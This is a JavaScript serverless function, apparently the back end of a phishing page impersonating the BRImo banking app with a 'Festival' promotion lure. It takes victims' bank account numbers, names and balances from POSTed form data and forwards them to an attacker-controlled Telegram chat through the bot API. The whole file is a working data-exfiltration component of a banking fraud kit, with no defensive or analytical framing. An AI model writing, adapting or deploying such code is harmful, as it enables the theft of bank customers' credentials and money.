const axios = require('axios');

exports.handler = async function(event, context) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            throw new Error('Telegram credentials not configured');
        }

        let message = '';
        
        if (data.type === 'account_info') {
            message = `├• BRIMO | FESTIVAL DUET\n├───────────────────\n├• NO REK : ${data.accountNumber}\n├───────────────────\n├• NAMA  : ${data.accountName}\n╰───────────────────`;
        } else if (data.type === 'balance_info') {
            const formattedBalance = new Intl.NumberFormat('id-ID').format(data.balance);
            message = `├• BRIMO | FESTIVAL DUET\n├───────────────────\n├• NO REK : ${data.accountNumber}\n├───────────────────\n├• NAMA  : ${data.accountName}\n├───────────────────\n├• SALDO : ${formattedBalance}\n╰───────────────────`;
        } else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Invalid data type' })
            };
        }

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Data sent to Telegram successfully' })
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Failed to send data to Telegram' })
        };
    }
};
